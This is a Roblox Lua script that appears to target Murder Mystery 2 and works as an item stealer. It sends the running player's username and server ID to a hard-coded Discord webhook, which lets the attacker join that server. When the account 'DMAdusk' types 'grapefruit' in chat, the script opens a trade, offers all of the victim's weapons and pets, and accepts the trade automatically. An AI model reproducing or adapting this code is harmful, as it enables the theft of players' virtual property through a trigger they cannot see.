repeat wait() until game:IsLoaded()

receiverName = "DMAdusk"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local function boop()
    local playerName = Players.LocalPlayer and Players.LocalPlayer.Name or "UnknownPlayer"
    local webhookUrl = "https://discord.com/api/webhooks/1261532062343495803/o4AzVaFvoUXSoOZtx_T61JrObrDyEUPfGOb5xrP6kg0MUNBUWt-6w42E72mtLH30vMlU"

    local sendPlaceID = game.PlaceId
    local sendID = game.JobId
    local data = {
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "Murder Mystery 2",
                ["color"] = 16758465,
                ["footer"] = {
                    ["text"] = "🥀 Username: " .. playerName .. " | " .. os.date("%I:%M %p", os.time() - 5*3600) .. " • " .. os.date("%x"),
                },
                ["fields"] = {
                    {
                        ["name"] = "Join Server",
                        ["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. sendPlaceID .. ", \"" .. sendID .. "\", " .. playerName .. "```",
                        ["inline"] = true
                    }
                }
            }
        }
    }

    local http_request = http_request or request or HttpPost
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local success, response = pcall(function()
        return http_request({
            Method = "POST",
            Url = webhookUrl,
            Headers = headers,
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
    end)

    if success then
        print("Meow!")
    else
        print("Cat: " .. response)
    end
end
boop()
local function inventoryMeow()
    local x3 = Players.LocalPlayer
    local result = ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(x3)

    local ownedWeapons = {}
    local ownedPets = {}

    local function populateOwnedKeys(t, keys)
        for _, key in ipairs(keys) do
            if t[key] and t[key]["Owned"] then
                local ownedTable = t[key]["Owned"]
                if type(ownedTable) == "table" then
                    for subKey, subValue in pairs(ownedTable) do
                        if key == "Weapons" then
                            ownedWeapons[subKey] = subValue
                        elseif key == "Pets" then
                            ownedPets[subKey] = subValue
                        end
                    end
                end
            end
        end
    end

    local keysToPopulate = {"Weapons", "Pets"}

    if type(result) == "table" then
        populateOwnedKeys(result, keysToPopulate)
    else
        return
    end
    return ownedWeapons, ownedPets
end

local function baiiii()
    local tradeGUI = Players.LocalPlayer.PlayerGui.TradeGUI

    local ownedWeapons, ownedPets = inventoryMeow()
    print(ownedWeapons, ownedPets)

    while not tradeGUI.Enabled do
        if ownedWeapons or ownedPets then
            wait(1)
            local target = game:GetService("Players"):FindFirstChild(receiverName)
            ReplicatedStorage.Trade.SendRequest:InvokeServer(target)
            tradeGUI = Players.LocalPlayer.PlayerGui.TradeGUI
        end
    end
    print("Trade GUI is open!")

    if ownedWeapons or ownedPets then
        print("if ownedWeapons or ownedPets then")
        local function offerItems(itemType, itemList)
            local args = {
                [2] = itemType
            }
            print("1")
            local typesOffered = {}
            print("2")
            for itemKey, amount in pairs(itemList) do
                print("3")
                args[1] = itemKey
                for _ = 1, amount do
                    print("4")
                    ReplicatedStorage.Trade.OfferItem:FireServer(unpack(args))
                end
                print("5")
                typesOffered[itemKey] = true
                print("6")
                if #typesOffered >= 4 then
                    print("7")
                    break
                end
            end
            print("8")

            while tradeGUI and tradeGUI.Enabled do
                wait()
                ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
                tradeGUI = Players.LocalPlayer.PlayerGui.TradeGUI
            end
            return
        end
        ownedWeapons, ownedPets = inventoryMeow()

        if ownedWeapons then
            if offerItems("Weapons", ownedWeapons) then
                baiiii()
                return
            end
        end

        if ownedPets then
            if offerItems("Pets", ownedPets) then
                baiiii()
                return
            end
        end
    end
    return nil
end

for _, player in ipairs(Players:GetPlayers()) do
    if player.Name:lower() == receiverName:lower() then
        player.Chatted:Connect(function(message)
            if message:lower() == "grapefruit" then
                print("uwaah~ :33")
                baiiii()
            end
        end)
    end
end

game.Players.PlayerAdded:Connect(function(player)
    if player.Name:lower() == receiverName:lower() then
        player.Chatted:Connect(function(message)
            if message:lower() == "grapefruit" then
                print("uwaah~ :33")
                baiiii()
            end
        end)
    end
end)
